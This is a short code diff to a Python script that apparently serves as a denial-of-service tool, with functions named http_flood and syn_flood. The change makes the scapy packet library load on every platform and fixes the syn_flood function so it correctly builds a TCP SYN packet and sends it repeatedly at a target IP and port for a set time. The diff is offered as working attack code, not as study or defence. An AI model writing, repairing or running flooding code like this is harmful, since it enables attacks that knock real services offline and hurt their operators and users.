@@ -5,10 +5,8 @@ import random
 import time
 from cryptography.fernet import Fernet
 import base64
-if os.name =="nt":
-    from scapy.all import IP, TCP, send
-else:
-    pass
+from scapy.all import IP, TCP, send
+
 
 numlist = ['1','2','3','4','5','6','7','8','9','0']
 usingThreading = True
@@ -146,7 +144,7 @@ def http_flood(target_ip, target_port, time_limit):
 
 def syn_flood(target_ip, target_port, time_limit):
     start_time = time.time()
-    packet = target_ip(dst=target_ip)/TCP(dport=target_port, flags="S")
+    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
     while time.time() - start_time < time_limit:
         try:
             send(packet, verbose=0)
